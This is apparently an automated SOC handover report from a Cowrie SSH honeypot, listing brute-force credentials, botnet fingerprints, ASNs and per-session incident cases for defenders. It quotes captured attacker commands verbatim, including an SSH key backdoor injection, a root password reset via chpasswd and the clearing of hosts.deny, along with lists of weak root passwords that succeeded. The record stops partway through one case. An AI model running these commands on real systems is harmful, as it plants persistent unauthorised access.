# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-15 |
| **Generated At** | 2026-06-15T04:48:11Z |
| **Shift Time** | 04:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **474** |
| Confirmed Threats | **403** |
| False Positives Filtered | **71** (15.0%) |
| Unique Attacker IPs | **47** |
| Countries of Origin | **21** |
| High Severity Cases | **110** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **364** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **304** |
| Unique Credential Pairs | **177** |
| Unique Usernames | **114** |
| Unique Passwords | **158** |
| Successful Auth Pairs | **71** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 110 |
| `345gs5662d34` | 51 |
| `mega` | 5 |
| `ubuntu` | 4 |
| `admin` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 51 |
| `3245gs5662d34` | 51 |
| `123` | 12 |
| `123456` | 11 |
| `1234` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 51 |
| `root` | `3245gs5662d34` | 51 |
| `mega` | `123` | 5 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Lk5YvhdIfY` | `42.193.141.153` | 2026-06-15T00:22:01 |
| `root` | `huawei!@#123` | `4.182.219.135` | 2026-06-15T00:39:33 |
| `root` | `3245gs5662d34` | `4.182.219.135` | 2026-06-15T00:39:36 |
| `root` | `hospital` | `4.182.219.135` | 2026-06-15T00:50:58 |
| `root` | `1234asdf` | `4.182.219.135` | 2026-06-15T00:56:27 |
| `root` | `A1s2d3f4` | `4.182.219.135` | 2026-06-15T00:58:28 |
| `root` | `M()nsterK!11` | `151.33.34.75` | 2026-06-15T00:59:35 |
| `root` | `3245gs5662d34` | `151.33.34.75` | 2026-06-15T00:59:39 |
| `root` | `Sm123456@` | `151.33.34.75` | 2026-06-15T01:01:45 |
| `root` | `123QWEasd` | `4.182.219.135` | 2026-06-15T01:02:17 |
| `root` | `M()nsterK!11` | `122.168.194.41` | 2026-06-15T01:02:27 |
| `root` | `3245gs5662d34` | `122.168.194.41` | 2026-06-15T01:02:29 |
| `root` | `fa` | `151.33.34.75` | 2026-06-15T01:03:53 |
| `root` | `pwd@12345` | `4.182.219.135` | 2026-06-15T01:04:14 |
| `root` | `fa` | `122.168.194.41` | 2026-06-15T01:04:33 |
| `root` | `1@qwaszX` | `4.182.219.135` | 2026-06-15T01:06:10 |
| `root` | `password!2026` | `4.182.219.135` | 2026-06-15T01:07:58 |
| `root` | `Hello@2024` | `4.182.219.135` | 2026-06-15T01:11:43 |
| `root` | `Yn123456` | `151.33.34.75` | 2026-06-15T01:12:11 |
| `root` | `Sm123456@` | `122.168.194.41` | 2026-06-15T01:12:42 |
| `root` | `Root@2026` | `110.14.190.217` | 2026-06-15T01:13:58 |
| `root` | `3245gs5662d34` | `110.14.190.217` | 2026-06-15T01:14:02 |
| `root` | `adm123456` | `4.182.219.135` | 2026-06-15T01:15:32 |
| `root` | `Admin%123` | `122.168.194.41` | 2026-06-15T01:18:58 |
| `root` | `robot` | `4.182.219.135` | 2026-06-15T01:19:22 |
| `root` | `bbbbbbbb` | `4.182.219.135` | 2026-06-15T01:21:16 |
| `root` | `Admin%123` | `151.33.34.75` | 2026-06-15T01:22:41 |
| `root` | `Yn123456` | `122.168.194.41` | 2026-06-15T01:25:15 |
| `root` | `AaBbCc123!@#` | `118.253.182.187` | 2026-06-15T01:29:05 |
| `root` | `admin123456789` | `101.126.89.144` | 2026-06-15T01:33:09 |
| `root` | `3245gs5662d34` | `101.126.89.144` | 2026-06-15T01:33:19 |
| `root` | `Passw0rd$` | `101.126.89.144` | 2026-06-15T01:34:06 |
| `root` | `tttttt` | `4.182.219.135` | 2026-06-15T01:34:44 |
| `root` | `root123@@` | `101.126.89.144` | 2026-06-15T01:35:02 |
| `root` | `admin_2025` | `142.93.48.137` | 2026-06-15T02:05:07 |
| `root` | `3245gs5662d34` | `142.93.48.137` | 2026-06-15T02:05:12 |
| `root` | `1234567890-=` | `142.93.48.137` | 2026-06-15T02:14:52 |
| `root` | `1qazcde3!@#` | `180.184.178.165` | 2026-06-15T02:20:20 |
| `root` | `3245gs5662d34` | `180.184.178.165` | 2026-06-15T02:20:23 |
| `root` | `123!@#Abc` | `103.188.177.46` | 2026-06-15T02:31:16 |
| `root` | `3245gs5662d34` | `103.188.177.46` | 2026-06-15T02:31:20 |
| `root` | `123456ABc` | `142.93.48.137` | 2026-06-15T02:34:24 |
| `root` | `Txtd1@#4` | `103.188.177.46` | 2026-06-15T02:35:19 |
| `root` | `support@123` | `103.188.177.46` | 2026-06-15T02:37:23 |
| `root` | `1234qwerQWER` | `223.247.218.112` | 2026-06-15T02:37:45 |
| `root` | `123456asd` | `142.93.48.137` | 2026-06-15T02:40:52 |
| `root` | `serverroot` | `223.247.218.112` | 2026-06-15T02:49:42 |
| `root` | `globalwarming` | `142.93.48.137` | 2026-06-15T02:57:09 |
| `root` | `agesci` | `223.247.218.112` | 2026-06-15T03:35:06 |
| `root` | `3245gs5662d34` | `223.247.218.112` | 2026-06-15T03:35:17 |
| `root` | `Kk123456` | `117.102.86.226` | 2026-06-15T03:41:26 |
| `root` | `3245gs5662d34` | `117.102.86.226` | 2026-06-15T03:41:31 |
| `root` | `12345qwerty` | `117.102.86.226` | 2026-06-15T03:45:34 |
| `root` | `admin2024` | `41.90.100.147` | 2026-06-15T03:45:45 |
| `root` | `3245gs5662d34` | `41.90.100.147` | 2026-06-15T03:45:50 |
| `root` | `1234567890Aa` | `78.83.249.54` | 2026-06-15T03:46:41 |
| `root` | `3245gs5662d34` | `78.83.249.54` | 2026-06-15T03:46:46 |
| `root` | `1Password!` | `117.102.86.226` | 2026-06-15T03:53:09 |
| `root` | `Abcd.2026` | `117.102.86.226` | 2026-06-15T03:59:03 |
| `root` | `qwER12#$` | `117.102.86.226` | 2026-06-15T04:01:08 |
| `root` | `As@123456789` | `117.102.86.226` | 2026-06-15T04:04:57 |
| `root` | `Root123@` | `117.102.86.226` | 2026-06-15T04:06:52 |
| `root` | `yasin123` | `117.102.86.226` | 2026-06-15T04:08:53 |
| `root` | `zxcasd123` | `117.102.86.226` | 2026-06-15T04:10:49 |
| `root` | `test333` | `117.102.86.226` | 2026-06-15T04:18:37 |
| `root` | `1987` | `117.102.86.226` | 2026-06-15T04:20:35 |
| `root` | `Aliyun123` | `117.102.86.226` | 2026-06-15T04:24:24 |
| `root` | `252525` | `117.102.86.226` | 2026-06-15T04:26:18 |
| `root` | `Zxc123456` | `117.102.86.226` | 2026-06-15T04:30:14 |
| `root` | `Ma123456` | `117.102.86.226` | 2026-06-15T04:32:09 |
| `root` | `20192019` | `117.102.86.226` | 2026-06-15T04:34:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **474** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 342 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 274 | 22 |
| `03a80b21afa8...` | Modern SSH client | 38 | 3 |
| `04315067d6e6...` | Modern SSH client | 3 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 274 | 22 | Mirai/variant |
| `03a80b21afa8...` | libssh | 38 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 27 | 3 | — |
| `04315067d6e6...` | libssh | 3 | 1 | Modern SSH client |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `864cef7e4d8a...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 5 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 51 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:qLaeqfDNQRkl"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `142.93.48.137`, `118.253.182.187`, `223.247.218.112`, `101.126.89.144`, `103.188.177.46`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `78.83.249.54`, `117.102.86.226`, `142.93.48.137`, `41.90.100.147`, `180.184.178.165`, `223.247.218.112`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **47** |
| Unique ASNs | **33** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | MEDIUM |
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 2 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (110)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-56339f1c554c

| Field | Detail |
|---|---|
| **Source IP** | `42.193.141[.]153` |
| **First Seen** | 2026-06-15 00:22 |
| **Last Seen** | 2026-06-15 00:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:22:00` | `cowrie.session.connect` |
| `2026-06-15 00:22:00` | `cowrie.client.version` |
| `2026-06-15 00:22:00` | `cowrie.client.kex` |
| `2026-06-15 00:22:01` | `cowrie.login.success` |
| `2026-06-15 00:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.193.141[.]153` to AbuseIPDB if not already reported
- [ ] Block `42.193.141[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0a843300333

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 00:39 |
| **Last Seen** | 2026-06-15 00:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:39:32` | `cowrie.session.connect` |
| `2026-06-15 00:39:32` | `cowrie.client.version` |
| `2026-06-15 00:39:32` | `cowrie.client.kex` |
| `2026-06-15 00:39:33` | `cowrie.login.success` |
| `2026-06-15 00:39:33` | `cowrie.session.params` |
| `2026-06-15 00:39:33` | `cowrie.command.input` |
| `2026-06-15 00:39:33` | `cowrie.command.failed` |
| `2026-06-15 00:39:33` | `cowrie.log.closed` |
| `2026-06-15 00:39:34` | `cowrie.session.params` |
| `2026-06-15 00:39:34` | `cowrie.command.input` |
| `2026-06-15 00:39:34` | `cowrie.session.file_download` |
| `2026-06-15 00:39:34` | `cowrie.log.closed` |
| `2026-06-15 00:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8d0dd11b3d

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 00:39 |
| **Last Seen** | 2026-06-15 00:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:39:36` | `cowrie.session.connect` |
| `2026-06-15 00:39:36` | `cowrie.client.version` |
| `2026-06-15 00:39:36` | `cowrie.client.kex` |
| `2026-06-15 00:39:36` | `cowrie.login.success` |
| `2026-06-15 00:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf7ef0efbec3

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 00:50 |
| **Last Seen** | 2026-06-15 00:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:50:57` | `cowrie.session.connect` |
| `2026-06-15 00:50:57` | `cowrie.client.version` |
| `2026-06-15 00:50:57` | `cowrie.client.kex` |
| `2026-06-15 00:50:58` | `cowrie.login.success` |
| `2026-06-15 00:50:58` | `cowrie.session.params` |
| `2026-06-15 00:50:58` | `cowrie.command.input` |
| `2026-06-15 00:50:58` | `cowrie.command.failed` |
| `2026-06-15 00:50:58` | `cowrie.log.closed` |
| `2026-06-15 00:50:59` | `cowrie.session.params` |
| `2026-06-15 00:50:59` | `cowrie.command.input` |
| `2026-06-15 00:50:59` | `cowrie.session.file_download` |
| `2026-06-15 00:50:59` | `cowrie.log.closed` |
| `2026-06-15 00:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b3f3402125

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 00:51 |
| **Last Seen** | 2026-06-15 00:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:51:01` | `cowrie.session.connect` |
| `2026-06-15 00:51:01` | `cowrie.client.version` |
| `2026-06-15 00:51:01` | `cowrie.client.kex` |
| `2026-06-15 00:51:01` | `cowrie.login.success` |
| `2026-06-15 00:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c519c0f90dc

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 00:56 |
| **Last Seen** | 2026-06-15 00:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:56:27` | `cowrie.session.connect` |
| `2026-06-15 00:56:27` | `cowrie.client.version` |
| `2026-06-15 00:56:27` | `cowrie.client.kex` |
| `2026-06-15 00:56:27` | `cowrie.login.success` |
| `2026-06-15 00:56:28` | `cowrie.session.params` |
| `2026-06-15 00:56:28` | `cowrie.command.input` |
| `2026-06-15 00:56:28` | `cowrie.command.failed` |
| `2026-06-15 00:56:28` | `cowrie.log.closed` |
| `2026-06-15 00:56:28` | `cowrie.session.params` |
| `2026-06-15 00:56:28` | `cowrie.command.input` |
| `2026-06-15 00:56:28` | `cowrie.session.file_download` |
| `2026-06-15 00:56:28` | `cowrie.log.closed` |
| `2026-06-15 00:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9edd40fedb0

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 00:56 |
| **Last Seen** | 2026-06-15 00:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:56:30` | `cowrie.session.connect` |
| `2026-06-15 00:56:30` | `cowrie.client.version` |
| `2026-06-15 00:56:30` | `cowrie.client.kex` |
| `2026-06-15 00:56:31` | `cowrie.login.success` |
| `2026-06-15 00:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4882ce63e48a

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 00:58 |
| **Last Seen** | 2026-06-15 00:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:58:27` | `cowrie.session.connect` |
| `2026-06-15 00:58:27` | `cowrie.client.version` |
| `2026-06-15 00:58:27` | `cowrie.client.kex` |
| `2026-06-15 00:58:28` | `cowrie.login.success` |
| `2026-06-15 00:58:28` | `cowrie.session.params` |
| `2026-06-15 00:58:28` | `cowrie.command.input` |
| `2026-06-15 00:58:28` | `cowrie.command.failed` |
| `2026-06-15 00:58:28` | `cowrie.log.closed` |
| `2026-06-15 00:58:29` | `cowrie.session.params` |
| `2026-06-15 00:58:29` | `cowrie.command.input` |
| `2026-06-15 00:58:29` | `cowrie.session.file_download` |
| `2026-06-15 00:58:29` | `cowrie.log.closed` |
| `2026-06-15 00:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a82aaab5fc2

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 00:58 |
| **Last Seen** | 2026-06-15 00:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:58:31` | `cowrie.session.connect` |
| `2026-06-15 00:58:31` | `cowrie.client.version` |
| `2026-06-15 00:58:31` | `cowrie.client.kex` |
| `2026-06-15 00:58:31` | `cowrie.login.success` |
| `2026-06-15 00:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19f8083d2786

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 00:59 |
| **Last Seen** | 2026-06-15 00:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:59:35` | `cowrie.session.connect` |
| `2026-06-15 00:59:35` | `cowrie.client.version` |
| `2026-06-15 00:59:35` | `cowrie.client.kex` |
| `2026-06-15 00:59:35` | `cowrie.login.success` |
| `2026-06-15 00:59:36` | `cowrie.session.params` |
| `2026-06-15 00:59:36` | `cowrie.command.input` |
